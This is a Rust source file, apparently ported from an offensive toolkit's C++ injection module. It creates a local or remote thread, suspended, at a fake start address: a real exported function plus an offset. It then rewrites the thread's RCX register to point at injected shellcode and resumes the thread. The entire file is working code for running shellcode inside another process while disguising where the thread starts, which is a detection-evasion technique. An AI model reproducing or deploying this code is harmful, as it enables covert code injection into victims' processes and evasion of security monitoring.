//! Port of src/inject_hinted.cpp — CreateThread / CreateRemoteThread with a
//! "hinted" function: start the thread at a fake exported function
//! (GetProcAddress(module, func) + offset) suspended, rewrite the start
//! address (RCX on x64) to the real shellcode, then resume.

use crate::inject::{PI_EXEC_CREATETHREAD_F, PI_EXEC_CREATEREMOTETHREAD_F};
use std::ffi::c_void;
use windows_sys::Win32::Foundation::HANDLE;
use windows_sys::Win32::System::Diagnostics::Debug::{
    GetThreadContext, SetThreadContext, CONTEXT, CONTEXT_FULL_AMD64,
};
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows_sys::Win32::System::Threading::{
    CreateRemoteThread, CreateThread, ResumeThread, CREATE_SUSPENDED, LPTHREAD_START_ROUTINE,
};

/// Create a suspended thread at a hinted function and redirect it to the
/// injected shellcode (inject_with_hinted_func).
pub fn inject_with_hinted_func(
    method: u32,
    h_process: isize,
    lp_start_address: *mut c_void,
    lp_parameter: *mut c_void,
    module: &[u8],
    func: &[u8],
    offset: u32,
) -> bool {
    unsafe {
        /* we're going to fail if the fake function doesn't exist... */
        // The C code passes the (non-NUL-terminated) module/function names
        // straight to GetModuleHandleA/GetProcAddress; an empty slice means
        // NULL (GetModuleHandleA(NULL) returns the executable's module).
        let module_name: *const u8 = if module.is_empty() {
            std::ptr::null()
        } else {
            module.as_ptr()
        };
        let h_module = GetModuleHandleA(module_name);
        if h_module.is_null() {
            return false;
        }

        let func_name: *const u8 = if func.is_empty() {
            std::ptr::null()
        } else {
            func.as_ptr()
        };
        let Some(fake_addr) = GetProcAddress(h_module, func_name) else {
            return false;
        };

        /* increment our fake function by our offset */
        let p_fake_addr = (fake_addr as *const ()) as usize + offset as usize;
        let routine: LPTHREAD_START_ROUTINE = std::mem::transmute(p_fake_addr as *mut c_void);

        /* create our thread */
        let h_thread: HANDLE = match method {
            PI_EXEC_CREATETHREAD_F => {
                CreateThread(std::ptr::null(), 0, routine, lp_parameter, CREATE_SUSPENDED, std::ptr::null_mut())
            }
            PI_EXEC_CREATEREMOTETHREAD_F => {
                CreateRemoteThread(h_process as HANDLE, std::ptr::null(), 0, routine, lp_parameter, CREATE_SUSPENDED, std::ptr::null_mut())
            }
            _ => std::ptr::null_mut(),
        };

        /* if one of the above failed, handle it appropriately */
        if h_thread.is_null() {
            return false;
        }

        /* get our thread context */
        let mut ctx: CONTEXT = std::mem::zeroed();
        ctx.ContextFlags = CONTEXT_FULL_AMD64;
        if GetThreadContext(h_thread, &mut ctx) == 0 {
            return false;
        }

        /* update the right register to make this kick off in the right place (x64 build) */
        ctx.Rcx = lp_start_address as u64;

        if SetThreadContext(h_thread, &ctx) == 0 {
            return false;
        }

        /* if the thread resumes, we're good, it worked */
        ResumeThread(h_thread) != u32::MAX
    }
}
